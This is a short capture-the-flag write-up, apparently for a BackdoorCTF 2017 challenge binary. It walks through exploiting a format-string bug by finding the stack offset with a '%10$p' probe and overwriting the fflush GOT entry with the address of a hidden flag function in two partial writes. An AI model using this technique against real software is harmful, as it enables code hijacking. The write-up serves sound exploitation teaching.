Executing the binary for the first time we have this behaviour:

<img class="img-responsive" src="{{ site-url }}/assets/backdoorctf17/baby-1.png">

Ok, cool, decompile it.

This is the main function:

<img class="img-responsive" src="{{ site-url }}/assets/backdoorctf17/baby-2.png">

Note: edata is in .bss and it is stdin

Immediatly we see the dumb `printf(&format)` call. Format string exploit? Yes.

After the vulnerable printf there is a fflush call, so i choose to overwrite its entry in the GOT.

In the functions list we can see the `flag(void)` function:

<img class="img-responsive" src="{{ site-url }}/assets/backdoorctf17/baby-3.png">

Now we must write an exploit to overwrite the fflush entry with the address of flag.

Because the flag address is a really big number i decided to split the format string in two write steps.

Above all we must locate the printf's parameter index corrispondent to the first 4 bytes of the buffer:

We try `AAAA %{INDEX}$p` with various indexes, and finally we get that with `AAAA %10$p` the program prints 0x41414141.

In the exploit we must write the last 2 bytes of the flag's address to the fflush got entry and the first two bytes to the got entry +2.

Remember that %n writes always 4 bytes.

Adjusting the number of printed chars to fit the flag address we have the exploit.

TADAAA
